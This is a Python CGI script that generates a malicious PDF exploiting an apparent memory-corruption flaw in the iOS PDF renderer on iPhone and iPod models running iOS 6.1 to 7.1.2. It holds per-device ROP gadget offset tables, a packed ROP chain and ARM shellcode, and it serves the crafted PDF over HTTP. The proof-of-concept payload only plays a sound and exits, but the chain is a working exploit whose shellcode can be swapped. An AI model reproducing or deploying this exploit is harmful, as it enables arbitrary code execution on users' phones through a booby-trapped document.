import os
import zlib
import sys
import struct
from miniPDF import *

doc= PDFDoc()
#pages
pages = PDFDict()
pages.add("Type", PDFName("Pages"))

#catalog
catalog = PDFDict()
catalog.add("Type", PDFName("Catalog"))
catalog.add("Pages", PDFRef(pages))

#lets add those to doc just for showing up the Ref object.
doc.add([catalog, pages])
#Set the pdf root
doc.setRoot(catalog)

_width=1
_height=256


import cgi
form = cgi.FieldStorage()
if "version" not in form or "shellcode" not in form or "baseaddr" not in form:
    output  = ""
    output += "Content-Type: application/pdf\n"     # HTML is following
    output += "\n"                                  # blank line, end of headers
    output += file("error.pdf","r").read()
    exit()

address = int(form["shellcode"].value,16)
dyld_shared_cache = int(form["baseaddr"].value,16)
version = form["version"].value


#address = int(sys.argv[1].split('&')[0].split('=')  [2:],16)
#dyld_shared_cache = int(sys.argv[1].split('&')[1][2:],16)
#version = sys.argv[1].split('&')[2]

_offsets = { "iPhone3,1-7.0.4": {
                                "gadget0": 0x0bdb60d8 + dyld_shared_cache, #_longjmp
                                "gadget1": 0x014f1257 + dyld_shared_cache, #memcpy
                                "gadget2": 0x002ba973 + dyld_shared_cache, 
                                "gadget3": 0x000d98eb + dyld_shared_cache,
                                "gadget4": 0x0bdb40df + dyld_shared_cache,
                                "gadget5": 0x015a60a5 + dyld_shared_cache,
                                "jit": 0xc0f54f8 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound":  0xda2c34 + dyld_shared_cache,
                                "exit":  0xbcc38dc + dyld_shared_cache,
                                 },
             "iPhone4,1-7.1":   {
                                "gadget0": 0x0c325008 + dyld_shared_cache,
                                "gadget1": 0x01551763 + dyld_shared_cache,
                                "gadget2": 0x00331167 + dyld_shared_cache, #0xc322e49 + dyld_shared_cache
                                "gadget3": 0x00118e6b + dyld_shared_cache, #0x1527ad9
                                "gadget4": 0x38322E5B -0x2c000000 + dyld_shared_cache, 
                                "gadget5": 0x016290a5 + dyld_shared_cache,
                                "jit": 0xc6805b0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound": 0xe1fd94 + dyld_shared_cache,
                                "exit": 0xc231a5c + dyld_shared_cache,
                                 },
             "iPhone5,1-7.1" :  {
                                "gadget0": 0x0c247798 + dyld_shared_cache,
                                "gadget1": 0x01600ad7 + dyld_shared_cache,
                                "gadget2": 0x00332433 + dyld_shared_cache,
                                "gadget3": 0x00119353 + dyld_shared_cache,
                                "gadget4": 0x38245BD9-0x2c000000 + dyld_shared_cache,
                                "gadget5": 0x0163e02d + dyld_shared_cache,
                                "jit": 0xc59e5a0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound": 0x2CE30249 -0x2c000000 + dyld_shared_cache,
                                "exit": 0x381E0710 - 0x2c000000 + dyld_shared_cache,
                                 },
              "iPhone5,1-7.1.1": {
                                "gadget0": 0x0c249798 + dyld_shared_cache,
                                "gadget1": 0x01600ad7 + dyld_shared_cache,
                                "gadget2": 0x00332433 + dyld_shared_cache,
                                "gadget3": 0x00119353 + dyld_shared_cache,
                                "gadget4": 0x38247BD9-0x2c000000 + dyld_shared_cache,
                                "gadget5": 0x0163e02d + dyld_shared_cache,
                                "jit": 0xc5a25a0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound":  0x2CE30249 -0x2c000000 + dyld_shared_cache,
                                "exit":  0x381E0710 - 0x2c000000 + dyld_shared_cache,
                                 },
              "iPhone5,1-7.1.2": {
                                "gadget0": 0x0c265798 + dyld_shared_cache,
                                "gadget1": 0x015a9a0f + dyld_shared_cache,
                                "gadget2": 0x003323cb + dyld_shared_cache,
                                "gadget3": 0x00119353 + dyld_shared_cache,
                                "gadget4": 0x38263BD9-0x2c000000 + dyld_shared_cache,
                                "gadget5": 0x0165602d + dyld_shared_cache,
                                "jit": 0xc5be5a0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound":  0x2CE30081 -0x2c000000 + dyld_shared_cache,
                                "exit":  0xc173819 + dyld_shared_cache,
                                 },
              "iPhone4-7.1.2" : {
                                "gadget0": 0x0c23d008 + dyld_shared_cache,
                                "gadget1": 0x015b7d47 + dyld_shared_cache,
                                "gadget2": 0x002f70ff + dyld_shared_cache,
                                "gadget3": 0x00118e6b + dyld_shared_cache,
                                "gadget4": 0x0c23ae49 + dyld_shared_cache,
                                "gadget5": 0x016070a5 + dyld_shared_cache,
                                "jit": 0xc5925b0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound":  0x00de5d94 + dyld_shared_cache,
                                "exit":  0x0c149a5c + dyld_shared_cache,
                                 },
             "iPod4,1-6.1.5" :   { "gadget1": 0x124559e + dyld_shared_cache,
                                   "gadget0": 0x920e6a0 + dyld_shared_cache,
                                   "jit": 0 + dyld_shared_cache,
                                   "exit": 0x92054dc + dyld_shared_cache,
                                   "AudioServicesPlaySystemSound": 0xbd4684+ dyld_shared_cache,
                                  },
             "iPhone3,1-6.1.2" : { "gadget0":0x41414141,
                                   "jit": 0 + dyld_shared_cache,
                                   "exit": 0x11111 + dyld_shared_cache,
                                   "AudioServicesPlaySystemSound": 0x22222+ dyld_shared_cache,
                                 },
            }


if not version in _offsets:
    output  = ""
    output += "Content-Type: application/pdf\n"     # HTML is following
    output += "\n"                            # blank line, end of headers
    output += file("error.pdf","r").read()
    exit()


if version in ["iPhone3,1-7.0.4", "iPhone4,1-7.1", "iPhone5,1-7.1", "iPhone5,1-7.1.1", "iPhone5,1-7.1.2", "iPhone4-7.1.2"]:
    stage1 = struct.pack('<L', 0x00000001)         # Refcount  <--- address
    stage1+= struct.pack('<L', address+0x14)       # unused
    stage1+= struct.pack('<L', 0x00000000)         # tokenlist -> null for now
    stage1+= struct.pack('<L', _offsets[version]['gadget0'])         # unused/longjump gadget 0
    stage1+= struct.pack('<L', address+0x4)
    stage1+= struct.pack('<L', 0x200) #r4
    stage1+= struct.pack('<L', _offsets[version]['jit']) #0x47474747) #r5
    stage1+= struct.pack('<L', _offsets[version]['jit'] - 24) #0x48484848) #r6
    stage1+= struct.pack('<L', 0x49494949) #r7
    stage1+= struct.pack('<L', 0x50505050)#dyld_shared_cache+0x15486a3)#0x14c56b3)#0x50505050) #r8
    stage1+= struct.pack('<L', address+23*4) #r10
    stage1+= struct.pack('<L', 0x52525252) #r11
    stage1+= struct.pack('<L', address+11*4) #_offsets[version]['jit']-7 *4) #sp
    stage1+= struct.pack('<L', _offsets[version]['gadget1']) #lr
    stage1+= struct.pack('<L', _offsets[version]['gadget4']) #0xbdb40df + dyld_shared_cache)
    stage1+= struct.pack('<L', 0x200)
    stage1+= struct.pack('<L', _offsets[version]['jit']-8)
    stage1+= struct.pack('<L', 0x60606060)
    stage1+= struct.pack('<L', _offsets[version]['gadget2']) #0x14a4ae9 + dyld_shared_cache) #ldr     r0, [r0, #0], pop     {r7, pc}
    stage1+= struct.pack('<L', 0x62626262)
    stage1+= struct.pack('<L',  _offsets[version]['gadget3']) #0x15359df+ dyld_shared_cache)
    stage1+= struct.pack('<L', 0x64646464)
    stage1+= struct.pack('<L',  _offsets[version]['gadget5']) #0x15a60a5+ dyld_shared_cache)
elif version in ["iPhone3,1-6.1.2" ] :
    stage1 = struct.pack('<L', 0x00000001)         # Refcount  <--- address
    stage1+= struct.pack('<L', address+0x14)       # unused
    stage1+= struct.pack('<L', 0x00000000)         # tokenlist -> null for now
    stage1+= struct.pack('<L', _offsets[version]['gadget0'])         # unused/longjump gadget 0
else:
    stage1 = "A"*100 #Not supported

'''
PoC Shellcode. Up to 108 bytes.
00000000 <_main>:
   0:	e2820009 	add	r0, r2, #9
   4:	e12fff10 	bx	r0

00000008 <_main_thumb>:
   8:	46fd      	mov	sp, pc
   a:	4b07      	ldr	r3, [pc, #28]	; (28 <stack_offset>)
   c:	449d      	add	sp, r3
   e:	4803      	ldr	r0, [pc, #12]	; (1c <ios_AudioServicesPlaySystemSound_param>)
  10:	4b03      	ldr	r3, [pc, #12]	; (20 <ios_AudioServicesPlaySystemSound>)
  12:	4798      	blx	r3
  14:	4b03      	ldr	r3, [pc, #12]	; (24 <ios_exit>)
  16:	2000      	movs	r0, #0
  18:	4718      	bx	r3
  1a:	46c0      	nop			; (mov r8, r8)

0000001c <ios_AudioServicesPlaySystemSound_param>:
  1c:	000003ae 	.word	0x000003ae

00000020 <ios_AudioServicesPlaySystemSound>:
  20:	2f938c34 	.word	0x2f938c34

00000024 <ios_exit>:
  24:	3a8598dc 	.word	0x3a8598dc

00000028 <stack_offset>:
  28:	00010000 	.word	0x00010000

'''
stage2 = '\x09\x00\x82\xe2\x10\xff\x2f\xe1\xfd\x46\x07\x4b\x9d\x44\x03\x48\x03\x4b\x98\x47\x03\x4b\x00\x20\x18\x47\xc0\x46'+struct.pack('<L', 0x3ea)+ struct.pack('<L', _offsets[version]['AudioServicesPlaySystemSound']|1) + struct.pack('<L', _offsets[version]['exit']|1)+struct.pack('<L', 0x50000)

stage1 +=stage2

assert (200-0x19-0x10-8-len(stage1))>=0

token  = struct.pack('<L', 0 )              #next
token += struct.pack('<L', 0x00000007 )     #type 07 (array)
token += struct.pack('<L', address )        #pointer to spray/controled memory
token += struct.pack('<L', 0x41424344 )     #$unknown/unused

strm = PDFStream(PDFDict(), token*2)

##XOBJECT
xobjdict = PDFDict()
xobjdict.add('Type', PDFName('XObject'))
xobjdict.add('Subtype', PDFName('Image'))
#xobjdict.add('ColorSpace', PDFArray([ PDFName('Indexed'), PDFName('DeviceRGB'), PDFNum(0x5555555555555550), PDFRef(strm)]))
xobjdict.add('ColorSpace', PDFArray([ PDFName('Indexed'), PDFName('DeviceRGB'), PDFNum(0x55555551-1), PDFRef(strm)]))
xobjdict.add('BitsPerComponent', PDFNum(8))
xobjdict.add('Width', PDFNum(_width))
xobjdict.add('Height',PDFNum(_height))

#xobjdict.add('Filter', PDFName('DCTDecode'))
#xobj = PDFStream(xobjdict, file(sys.argv[1]).read())
xobj = PDFStream(xobjdict, "B"*256)

contents = PDFStream(PDFDict(), ('q '+ ' 0 '*100 + str(PDFOctalString(stage1+'a'*(200-0x19-0x10-8-len(stage1))))*1000 +
' /Im1 Do '+' Q'+ " khj ] ) wd !#$% "  ).encode('zlib'))
contents.dict.add('Filter', PDFName('FlateDecode'))
resources = PDFDict()
resources.add('ProcSet', PDFArray([PDFName('PDF'), PDFName('ImageC'), PDFName('ImageI'), PDFName('ImageB')]))

Im1=PDFDict()
Im1.add('Im1',PDFRef(xobj))
resources.add('XObject', Im1)

#The pdf page
page = PDFDict()
page.add('Type', '/Page')
page.add('Parent', PDFRef(pages))
page.add('MediaBox', PDFArray([ 0, 0, _width, _height]))
page.add('Contents', PDFRef(contents))
page.add('Resources', PDFRef(resources))

[doc.add(x) for x in [xobj, contents, resources, page, strm]]
pages.add('Count', PDFNum(1))
pages.add('Kids',PDFArray([PDFRef(page)]))

output  = ""
output += "Content-Type: application/pdf\n"     # HTML is following
output += "\n"                            # blank line, end of headers
output += doc.__str__()

print output,

